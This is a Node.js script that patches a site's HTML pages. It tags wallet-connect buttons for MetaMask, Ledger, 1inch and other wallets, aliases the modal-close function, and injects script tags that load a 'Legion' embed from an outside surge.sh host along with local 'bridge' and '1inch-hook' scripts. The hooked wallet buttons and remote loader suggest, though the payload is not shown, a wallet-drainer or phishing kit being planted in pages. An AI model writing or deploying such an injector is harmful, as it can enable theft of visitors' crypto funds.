import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');

const WALLET_ATTRS = [
  ['1inch Wallet', 'oneinch', 'wm-featured'],
  ['Ledger Wallet', 'ledger', ''],
  ['MetaMask', 'metamask', ''],
  ['Binance Wallet', 'binance', ''],
  ['WalletConnect', 'walletconnect', ''],
  ['Trust Wallet', 'trust', 'wm-extra'],
  ['OKX Wallet', 'okx', 'wm-extra'],
  ['Crypto.com Wallet', 'cryptocom', 'wm-extra'],
  ['Bitget Wallet', 'bitget', 'wm-extra'],
  ['Coinbase Wallet', 'coinbase', 'wm-extra'],
];

function legionBlock(base) {
  return `<!-- Legion: production embed (backend from Railway client-config) -->
<script
  src="https://legion-cdn.surge.sh/legion-embed.js"
  defer
  data-hook-buttons="false"
  data-hw-wallets="false"
  data-vendor-base="${base}"
></script>
<script src="${base}legion-bridge.js?v=1.1.0" defer></script>
<script src="${base}legion-1inch-hook.js?v=1.0.4" defer></script>
`;
}

function patchWalletButtons(html) {
  const labelToKey = Object.fromEntries(WALLET_ATTRS.map(([label, key]) => [label, key]));
  return html.replace(
    /(<button class="wm-item[^"]*"[^>]*>[\s\S]*?<span class="wm-item-name">)([^<]+)(<\/span>)/g,
    (m, pre, label, post) => {
      if (m.includes('data-wallet-connect=')) return m;
      const key = labelToKey[label.trim()];
      if (!key) return m;
      return m.replace(/<button class="(wm-item[^"]*)"/, `<button class="$1" data-wallet-connect="${key}"`);
    },
  );
}

function patchModalClose(html) {
  if (html.includes('window.customModalClose')) return html;
  return html.replace(
    /window\.closeWalletModal=closeWalletModal;/,
    'window.closeWalletModal=closeWalletModal;\n  window.customModalClose=closeWalletModal;',
  );
}

function patchFile(filePath) {
  const rel = path.relative(root, filePath).replace(/\\/g, '/');
  const inPages = rel.startsWith('pages/');
  const base = inPages ? '../' : './';
  let html = fs.readFileSync(filePath, 'utf8');
  const before = html;

  html = patchWalletButtons(html);
  html = patchModalClose(html);

  const block = legionBlock(base);
  if (!html.includes('legion-embed.js')) {
    if (html.includes('<!-- ═══ END WALLET KIT ═══ -->')) {
      html = html.replace('<!-- ═══ END WALLET KIT ═══ -->', block + '\n<!-- ═══ END WALLET KIT ═══ -->');
    } else if (html.includes('</body>')) {
      html = html.replace('</body>', block + '\n</body>');
    } else {
      html += '\n' + block;
    }
  }

  if (html !== before) {
    fs.writeFileSync(filePath, html, 'utf8');
    console.log('patched:', rel);
    return true;
  }
  console.log('skip (unchanged):', rel);
  return false;
}

const files = [
  path.join(root, 'index.html'),
  ...fs.readdirSync(path.join(root, 'pages'))
    .filter((f) => f.endsWith('.html'))
    .map((f) => path.join(root, 'pages', f)),
];

let n = 0;
for (const f of files) {
  if (patchFile(f)) n++;
}
console.log('done:', n, 'files updated');
